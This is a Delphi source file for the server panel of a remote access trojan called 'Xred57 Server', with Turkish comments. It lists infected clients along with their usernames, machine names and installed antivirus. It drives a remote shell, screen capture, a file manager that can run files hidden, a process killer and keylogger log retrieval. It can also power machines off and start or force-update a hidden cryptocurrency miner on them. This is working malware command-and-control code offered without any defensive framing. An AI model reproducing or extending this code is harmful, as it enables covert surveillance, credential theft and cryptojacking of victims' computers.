unit Server;

interface

uses
  Windows, Messages, Forms, Classes, StdCtrls, Sysutils, Menus, Controls, ExtCtrls, ComCtrls, ImgList, Graphics, ToolWin,
  ScktComp, WinSock, uSockets, uFunctions, uTypes;

type
  TFormServer = class(TForm)
    MainMenu: TToolBar;
    CenterPanel: TPanel;
    Log: TRichEdit;
    Image32: TImageList;
    Image16: TImageList;
    ServerListen: TToolButton;
    Clearlog: TToolButton;
    SettingsManager: TToolButton;
    HelpMe: TToolButton;
    FullScreen: TToolButton;
    Separator1: TToolButton;
    Seperator2: TToolButton;
    Clients: TListView;
    ClientProcess: TPopupMenu;
    ClientTerminal: TMenuItem;
    ClientScreenManager: TMenuItem;
    ClientFileManager: TMenuItem;
    ClientInfoManager: TMenuItem;
    CreateClient: TToolButton;
    NewUpdate: TToolButton;
    Separator3: TToolButton;
    UpdateDns: TToolButton;
    StatusBar: TStatusBar;
    ClientMiningManager: TMenuItem;
    MiningManager: TToolButton;
    ProcessExplorer: TMenuItem;
    KeyLog: TMenuItem;
    Power1: TMenuItem;
    PowerOff: TMenuItem;
    PowerRestart: TMenuItem;
    PowerLogoff: TMenuItem;
    MiningStart: TMenuItem;
    MiningStop: TMenuItem;
    UpdateMiner: TMenuItem;
    MiningDisable: TMenuItem;
    N1: TMenuItem;
    EnableMining: TMenuItem;
    Panel1: TPanel;
    FindClientText: TMemo;
    Panel2: TPanel;
    FindClientButton: TButton;
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure ClientsChange(Sender: TObject; Item: TListItem; Change: TItemChange);
    procedure ClientTerminalClick(Sender: TObject);
    procedure ClientScreenManagerClick(Sender: TObject);
    procedure ClientFileManagerClick(Sender: TObject);
    procedure ClientInfoManagerClick(Sender: TObject);
    procedure ServerListenClick(Sender: TObject);
    procedure ClearlogClick(Sender: TObject);
    procedure UpdateDnsClick(Sender: TObject);
    procedure FullScreenClick(Sender: TObject);
    procedure SettingsManagerClick(Sender: TObject);
    procedure HelpMeClick(Sender: TObject);
    procedure NewUpdateClick(Sender: TObject);
    procedure CreateClientClick(Sender: TObject);
    procedure ClientsColumnClick(Sender: TObject; Column: TListColumn);
    procedure ClientsCompare(Sender: TObject; Item1, Item2: TListItem; Data: Integer; var Compare: Integer);
    procedure ClientsDeletion(Sender: TObject; Item: TListItem);
    procedure ClientMiningManagerClick(Sender: TObject);
    procedure ProcessExplorerClick(Sender: TObject);
    procedure KeyLogClick(Sender: TObject);
    procedure PowerOffClick(Sender: TObject);
    procedure PowerRestartClick(Sender: TObject);
    procedure PowerLogoffClick(Sender: TObject);
    procedure MiningManagerClick(Sender: TObject);
    procedure MiningStartClick(Sender: TObject);
    procedure MiningStopClick(Sender: TObject);
    procedure UpdateMinerClick(Sender: TObject);
    procedure MiningDisableClick(Sender: TObject);
    procedure EnableMiningClick(Sender: TObject);
    procedure FindClientButtonClick(Sender: TObject);
    procedure FindClientTextChange(Sender: TObject);
    procedure FindClientTextKeyPress(Sender: TObject; var Key: Char);
  private
    Server: TTCPServer;
    procedure FindClient(SearchStr: string);
    procedure ServerConnect(Client: TTCPConnection);
    procedure ServerDisconnect(Client: TTCPConnection);
    procedure ServerExecute(Thread: TTCPConnectionThread);
    procedure ServerError(Socket: TTCPSocket);
  public
  end;

var
  FormServer: TFormServer;
  ColumnToSort: Integer;
  Accending: Boolean;
  StartIndex: Integer = 0;

implementation

uses
  SettingsManager, NewUpdate, NewClient,
  ClientMining, ClientFileManager, ClientInformation, ClientScreen, ClientTerminal, ClientPE, ClientKeylogger;

{$R *.dfm}

{****************************************************************************
                      Form & VCL Event -> Baþlangýç
****************************************************************************}

procedure TFormServer.FormCreate(Sender: TObject);
begin
  // Create Server
  Server := TTCPServer.Create;
  with Server do
  begin
    OnConnect := ServerConnect;
    OnDisconnect := ServerDisconnect;
    OnExecute := ServerExecute;
    OnError := ServerError;
  end;
end; (* Form Create -> Server Oluþtur *)

procedure TFormServer.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  Server.Listen := False;
  Server.Free;
end; (* Form Close -> Client Baðlantýsýný Kes ve Kapat *)

procedure TFormServer.ClientsChange(Sender: TObject; Item: TListItem; Change: TItemChange);
begin
  StatusBar.Panels[0].Text := 'Aktif Client: ' + IntToStr(Clients.Items.Count);
end; (* Client List Change -> Client Sayýsýný Statusda Gösterir *)

procedure TFormServer.ClientsDeletion(Sender: TObject; Item: TListItem);
begin
  StatusBar.Panels[0].Text := 'Aktif Client: ' + IntToStr(Clients.Items.Count - 1);
end; (* Client List Change -> Client Sayýsýný Statusda Gösterir *)

procedure TFormServer.ClientsColumnClick(Sender: TObject; Column: TListColumn);
begin
  ColumnToSort := Column.Index;
  Clients.AlphaSort;
  Accending := not Accending;
end; (* ClientsColumnClick -> Client Listesi Sýralama *)

procedure TFormServer.ClientsCompare(Sender: TObject; Item1, Item2: TListItem; Data: Integer; var Compare: Integer);
begin
  if ColumnToSort = 0 then
  begin
    if Accending then
      Compare := CompareText(Item1.Caption, Item2.Caption)
    else
      Compare := CompareText(Item2.Caption, Item1.Caption);
  end
  else if ColumnToSort <> 1 then
  begin
    if Accending then
      Compare := CompareText(Item1.SubItems[ColumnToSort - 1], Item2.SubItems[ColumnToSort - 1])
    else
      Compare := -CompareText(Item1.SubItems[ColumnToSort - 1], Item2.SubItems[ColumnToSort - 1])
  end;
end; (* ClientsCompare -> Client Listesi Sýralama *)

{****************************************************************************
                      TCP Server Event -> Baþlangýç
****************************************************************************}

procedure TFormServer.ServerConnect(Client: TTCPConnection);
begin
  // Yeni Client Data Oluþtur
  Client.Data := TClientData.Create;
  with TClientData(Client.Data) do
  begin
    IP := Client.PeerIP;
    LocalIP := Client.LocalIP;
    Forms := TStringList.Create;
  end;

  // Set Buffer Size
  Client.RecvBufferSize := 65536;

  // Create Thread
  Client.Detach;
end; (* Connect -> Client Baðlandýðýnda Çalýþýr *)

procedure TFormServer.ServerDisconnect(Client: TTCPConnection);
var
  LI: TListItem;
  Index: Integer;
begin
  // Remove Client List
  LI := Clients.FindData(0, Client, True, False);
  if Assigned(LI) then
    Clients.Items.Delete(LI.Index);

  // Play Sound
  if FormSettings.PlayDisconnectSound.Checked then PlaySound('NOTIFYOFF');

  // Add Log & Close Window
  with TClientData(Client.Data) do
  begin
    AddLog(Log, clRed, 'Baðlandý Kesildi -> ' + IP);

    // Close Window
    if Forms.Count > 0 then
      for Index := 0 to Forms.Count - 1 do
        TCForm(Forms.Objects[Index]).Close;

    Free;
  end;
end; (* Disconnect -> Client Baðlandýðýntýsý Kesildiðinde Çalýþýr *)

procedure AddList(Thread: TTCPConnectionThread);
var
  SL: TStringList;
begin
  // Extract Info
  SL := TStringList.Create;
  SL.Delimiter := '|';
  SL.DelimitedText := '"' + StringReplace(Thread.Connection.ReadLn, SL.Delimiter, '"' + SL.Delimiter + '"', [rfReplaceAll]) + '"';

  with TClientData(Thread.Connection.Data) do
  begin
    Username := SL.Strings[0];
    PCName := SL.Strings[1];
    AntiVirus := SL.Strings[2];
    OS := SL.Strings[3];
    CliVersion := SL.Strings[4];
    MacAddr := SL.Strings[6];
    is64 := StrToBool(SL.Strings[7]);
    MinActive := StrToBool(SL.Strings[5]);
    MinVersion := StrToInt(SL.Strings[8]);

      // Clienti Listeye Ekle
    with FormServer.Clients.Items.Add do
    begin
      Caption := Thread.Connection.PeerIP;
      SubItems.Insert(0, Username);
      SubItems.Insert(1, PCName);
      SubItems.Insert(2, AntiVirus);
      SubItems.Insert(3, OS);
      SubItems.Insert(4, CliVersion);
      SubItems.Insert(5, BoolToString(MinActive));
      SubItems.Insert(6, IntToStr(MinVersion));
      Data := Thread.Connection;
    end;
  end;

  // Add Log
  AddLog(FormServer.Log, clPurple, 'Client Baðlandý -> ' + Thread.Connection.PeerIP);

  // Play Sound
  if FormSettings.PlayConnectSound.Checked then PlaySound('NOTIFY');
end;

procedure TFormServer.ServerExecute(Thread: TTCPConnectionThread);
var
  CMD: string;
  LI: TListItem;
begin
  CMD := Thread.Connection.ReadLn;

  // Process Command
  if CMD = 'first_information' then AddList(Thread);
  if CMD = 'information' then ExecuteThreadForm(TInformationForm, 'INFO', Thread.Connection, CMD);
  if CMD = 'screenshoot' then ExecuteThreadForm(TScreenForm, 'SCREEN', Thread.Connection, CMD);
  if POS(CMD, '|console_run|console_cmd|console_stop') > 0 then ExecuteThreadForm(TTerminalForm, 'CONSOLE', Thread.Connection, CMD);
  if POS(CMD, '|fm_disklist|fm_desktop|fm_userdir|fm_listdir|fm_filerecv|fm_filesend|fm_filerun|fm_filerunhidden|fm_filecut|' +
    'fm_filecopy|fm_filerename|fm_filedelete|fm_filedeletehard|fm_fileinfo|fm_filecreatedir|fm_filecreatefile|fm_viewimage|fm_viewtext' +
    '|fm_editnotepad|fm_editnotepadsave') > 0 then
    ExecuteThreadForm(TFileManagerForm, 'FILE', Thread.Connection, CMD);
  if POS(CMD, '|pe_list|pe_kill|pe_new') > 0 then ExecuteThreadForm(TPEForm, 'PE', Thread.Connection, CMD);
  if POS(CMD, '|log_list|log_view|log_delete') > 0 then ExecuteThreadForm(TKeyloggerForm, 'KEYLOG', Thread.Connection, CMD);

  // Mining
  if POS(CMD, '|mining_start|mining_stop|mining_update|mining_enable|mining_disable|mining_version') > 0 then MiningForm.ExecuteThread(Thread.Connection, CMD);

  // Auto Update Mining
  if MiningForm.ClientAutoUpdate.Checked then
    with TClientData(Thread.Connection.Data) do begin
      if MiningForm.ClientForceUpdate.Checked and not MinVerChecked then begin
        // Disable Auto Update This Client
        MinVerChecked := True;
        AddLog(Log, clGreen, Format('%s -> Mining Zorunlu Güncelleme Yapýlýyor [%s => %s]', [Thread.Connection.PeerIP, IntToStr(MinVersion), IntToStr(MiningVersion)]));
        Thread.Connection.WriteLn('mining_update');
        Thread.Connection.WriteInteger(MiningVersion);
      end else if not MinVerChecked and MinActive then begin
        // Disable Auto Update This Client
        MinVerChecked := True;

        if MinVersion < MiningVersion then begin
          AddLog(Log, clGreen, Format('%s -> Mining Otomatik Güncelleniyor [%s => %s]', [Thread.Connection.PeerIP, IntToStr(MinVersion), IntToStr(MiningVersion)]));
          Thread.Connection.WriteLn('mining_update');
          Thread.Connection.WriteInteger(MiningVersion);
        end;
      end;
    end;
end; (* Execute -> Client Baðlantý Saðlandýðýnda Çalýþýr *)

procedure TFormServer.ServerError(Socket: TTCPSocket);
begin
  if Socket.LastError <> WSAECONNRESET then
    AddLog(Log, clRed, Format('Server Error #%d: %s', [Socket.LastError, Socket.LastErrorMessage]));
end; (* Error -> Client Hatasý Oluþtuðunda Çalýþýr *)

{****************************************************************************
                      Main Menü Ýþlemler -> Baþlangýç
****************************************************************************}

procedure TFormServer.ServerListenClick(Sender: TObject);
begin
  if Server.Listen then
  begin
    // Stop Listening
    Server.Listen := False;

    // Change Listen Button Name
    ServerListen.Caption := 'Listen';

    // Add Log
    AddLog(Log, clRed, 'Server Durduruldu -> ' + GetLocalIP.CommaText + ':' + FormSettings.ServerPort.Text);

    // View Status
    StatusBar.Panels.Items[3].Text := 'Server IP: ';
  end else
  begin
    try
      // Start Listening
      Server.Bindings.Clear;
      Server.AddBinding(TTCPBinding.Create(GetLocalIP.CommaText + ':' + FormSettings.ServerPort.Text));
      Server.Listen := True;

      // Change Listen Button Name
      ServerListen.Caption := 'Stop Server';

      // Add Log
      AddLog(Log, clGreen, 'Server Baþlatýldý -> ' + GetLocalIP.CommaText + ':' + FormSettings.ServerPort.Text);

      // View Status
      StatusBar.Panels.Items[3].Text := 'Server IP: ' + GetLocalIP.CommaText + ':' + FormSettings.ServerPort.Text;
    except on E: Exception do
        AddLog(Log, clRed, E.Message);
    end;
  end;
end; (* Server Listening -> Sunucuyu Baþlat & Durdur *)

procedure TFormServer.ClearlogClick(Sender: TObject);
begin
  Log.Lines.Clear;
end; (* Clear Log -> Loglarý Temizle *)

procedure TFormServer.UpdateDnsClick(Sender: TObject);
begin
  if FormSettings.DnsUpdateURL.Text <> '' then
    AddLog(Log, clGreen, Trim(GetInetData(FormSettings.DnsUpdateURL.Text)));
end; (* Update DNS -> DNS IP Adresini Yenile *)

procedure TFormServer.FullScreenClick(Sender: TObject);
begin
  // Formu Tam Ekran Yap
  if WindowState = wsMaximized then
  begin
    WindowState := wsNormal;
    BorderStyle := bsSizeable;
  end else
  begin
    BorderStyle := bsNone;
    WindowState := wsMaximized;
  end;
end; (* FullScreen -> Tam Ekran Moduna Geç *)

procedure TFormServer.SettingsManagerClick(Sender: TObject);
begin
  FormSettings.ShowModal;
end; (* Settings Manager -> Sistem Ayarlarýný Aç *)

procedure TFormServer.MiningManagerClick(Sender: TObject);
begin
  MiningForm.Show;
end;

procedure TFormServer.HelpMeClick(Sender: TObject);
begin
  Application.MessageBox('Serverin çalýþmasý için modeminizden "Server Portunu" bu bilgisayarýn IP adresine yönlendirin.',
    'Xred57 Server', MB_OK or MB_ICONINFORMATION);
end; (* HelpMe -> Yardým Ýletisini Görüntüler *)

procedure TFormServer.NewUpdateClick(Sender: TObject);
var
  Form: TForm;
begin
  Form := TFormNewUpdate.Create(Self);
  Form.ShowModal;
end; { NewUpdate -> Yeni Güncelleme Oluþturur }

procedure TFormServer.CreateClientClick(Sender: TObject);
var
  Form: TForm;
begin
  Form := TFormNewClient.Create(Self);
  Form.ShowModal;
end; { CreateClient -> Yeni Client Oluþturur }

{****************************************************************************
                      Client Ýþlemleri -> Baþlangýç
****************************************************************************}

procedure TFormServer.ClientTerminalClick(Sender: TObject);
begin
  if Clients.SelCount > 0 then
    ShowClientProcessForm(Application, TTerminalForm, 'CONSOLE', TTCPConnection(Clients.Selected.Data));
end; { GetCMDCommandExecute -> CMD Eriþimi Butonu }

procedure TFormServer.ClientScreenManagerClick(Sender: TObject);
begin
  if Clients.SelCount > 0 then
    ShowClientProcessForm(Application, TScreenForm, 'SCREEN', TTCPConnection(Clients.Selected.Data));
end; { GetScreenImageExecute -> Ekran Resmini Çek Butonu }

procedure TFormServer.ClientFileManagerClick(Sender: TObject);
begin
  if Clients.SelCount > 0 then
    ShowClientProcessForm(Application, TFileManagerForm, 'FILE', TTCPConnection(Clients.Selected.Data));
end; { GetFileManagerExecute -> Dosya Yöneticisi }

procedure TFormServer.ClientInfoManagerClick(Sender: TObject);
begin
  if Clients.SelCount > 0 then
    ShowClientProcessForm(Application, TInformationForm, 'INFO', TTCPConnection(Clients.Selected.Data));
end; { GetPCInformationExecute -> Detaylý Bilgi Butonu }

procedure TFormServer.ProcessExplorerClick(Sender: TObject);
begin
  if Clients.SelCount > 0 then
    ShowClientProcessForm(Application, TPEForm, 'PE', TTCPConnection(Clients.Selected.Data));
end; { ProcessExplorerClick -> Görev Yöneticisi }

procedure TFormServer.KeyLogClick(Sender: TObject);
begin
  if Clients.SelCount > 0 then
    ShowClientProcessForm(Application, TKeyloggerForm, 'KEYLOG', TTCPConnection(Clients.Selected.Data));
end; { KeyLogClick -> Klavye Loglarýný Gösterir }

procedure TFormServer.ClientMiningManagerClick(Sender: TObject);
begin
end; { ClientMiningExecute -> Özel Mining Ayarlarý }

procedure TFormServer.PowerOffClick(Sender: TObject);
begin
  if Clients.SelCount > 0 then
    TTCPConnection(Clients.Selected.Data).WriteLn('sys_poweroff');
end;

procedure TFormServer.PowerRestartClick(Sender: TObject);
begin
  if Clients.SelCount > 0 then
    TTCPConnection(Clients.Selected.Data).WriteLn('sys_powerrestart');
end;

procedure TFormServer.PowerLogoffClick(Sender: TObject);
begin
  if Clients.SelCount > 0 then
    TTCPConnection(Clients.Selected.Data).WriteLn('sys_logoff');
end;

procedure TFormServer.MiningStartClick(Sender: TObject);
begin
  if Clients.SelCount > 0 then
    MiningForm.StartMining(TTCPConnection(Clients.Selected.Data));
end;

procedure TFormServer.MiningStopClick(Sender: TObject);
begin
  if Clients.SelCount > 0 then
    MiningForm.StopMining(TTCPConnection(Clients.Selected.Data));
end;

procedure TFormServer.UpdateMinerClick(Sender: TObject);
begin
  if Clients.SelCount > 0 then
    MiningForm.UpdateMining(TTCPConnection(Clients.Selected.Data));
end;

procedure TFormServer.EnableMiningClick(Sender: TObject);
begin
  if Clients.SelCount > 0 then
    MiningForm.EnableMining(TTCPConnection(Clients.Selected.Data));
end;

procedure TFormServer.MiningDisableClick(Sender: TObject);
begin
  if Clients.SelCount > 0 then
    MiningForm.DisableMining(TTCPConnection(Clients.Selected.Data));
end;

{****************************************************************************
                                Clients Search
****************************************************************************}

procedure TFormServer.FindClient(SearchStr: string);
var
  LI: TListItem;
  CommaText: string;
  i, k: Integer;
begin
  for i := StartIndex to Clients.Items.Count - 1 do begin
    CommaText := Clients.Items.Item[i].Caption;
    for k := 0 to Clients.Items.Item[i].SubItems.Count - 1 do begin
      CommaText := CommaText + Clients.Items.Item[i].SubItems.Strings[k];
    end;

    if POS(SearchStr, CommaText) > 0 then begin
      Clients.Selected := Clients.Items.Item[i];
      Clients.Items.Item[i].MakeVisible(True);
      StartIndex := i + 1;
      Break;
    end;

    CommaText := '';
  end;
end;

procedure TFormServer.FindClientButtonClick(Sender: TObject);
begin
  if Length(FindClientText.Text) >= 3 then
    FindClient(FindClientText.Text);
end;

procedure TFormServer.FindClientTextChange(Sender: TObject);
begin
  StartIndex := 0;
end;

procedure TFormServer.FindClientTextKeyPress(Sender: TObject; var Key: Char);
begin
  // Disable Enter & Search
  if Ord(Key) = VK_RETURN then begin
    Key := #0;
    if Length(FindClientText.Text) >= 3 then
      FindClient(FindClientText.Text);
  end;
end;

end.

